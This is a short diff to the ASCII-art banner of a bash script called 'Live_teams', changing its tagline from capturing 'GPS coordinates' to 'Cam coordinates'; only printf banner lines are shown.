@@ -20,7 +20,7 @@ trap 'printf "\n";stop' 2
     printf '\e[1;31m       ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\n'                                                                                
     printf " \e[1;93m                           Live_teams 0.1 - by Deepak Kumar [Techteams]\e[0m \n"
     printf " \e[1;92m                           www.techteams.online | youtube.com/techteams05 \e[0m \n"
-    printf "\e[1;90m         Techteams is a simple and light tool for information gathering and capture GPS coordinates.\e[0m \n"
+    printf "\e[1;90m         Techteams is a simple and light tool for information gathering and capture Cam coordinates.\e[0m \n"
     printf "\n"
     }
 
